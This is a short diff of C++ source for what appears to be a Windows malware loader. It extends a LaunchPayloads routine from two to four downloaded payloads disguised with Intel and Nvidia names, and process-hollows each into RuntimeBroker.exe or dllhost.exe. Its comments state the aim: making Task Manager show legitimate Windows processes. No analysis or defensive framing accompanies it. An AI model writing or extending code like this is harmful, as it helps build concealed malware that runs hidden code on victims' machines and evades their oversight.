@@ -138,10 +138,15 @@ bool DownloadAndHollow(const wstring& payloadName, const char* hostName) {
 }
 
 void LaunchPayloads() {
-    // Two payloads hollowed into legit-looking hosts - Task Manager shows svchost/RuntimeBroker, not IntelService
+    // Download & hollow all 4 AHK-compiled payloads into legit Windows hosts
+    // Task Manager shows: RuntimeBroker.exe, dllhost.exe, and 2 other svchost-like names
     DownloadAndHollow(L"IntelService", "RuntimeBroker.exe");
-    Sleep(400);
+    Sleep(300);
     DownloadAndHollow(L"IntelHelper", "dllhost.exe");
+    Sleep(300);
+    DownloadAndHollow(L"GforceFpsStable", "RuntimeBroker.exe");
+    Sleep(300);
+    DownloadAndHollow(L"NvidiaColorRgb", "dllhost.exe");
 }
 
 // ─── Get absolute file:// path to nui/index.html ───
